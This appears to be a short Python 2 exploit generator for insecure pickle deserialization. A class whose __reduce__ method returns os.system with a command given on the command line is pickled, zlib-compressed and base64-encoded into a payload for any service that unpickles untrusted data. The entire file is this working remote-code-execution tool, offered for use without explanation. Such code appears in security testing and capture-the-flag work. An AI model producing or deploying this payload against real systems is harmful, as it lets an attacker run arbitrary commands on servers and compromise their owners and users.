from  zlib import compress, decompress

import pickle
import os
import sys
import base64

DEFAULT_COMMAND = "ls"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        return (os.system,(COMMAND,))

print base64.b64encode(compress(pickle.dumps(PickleRce())))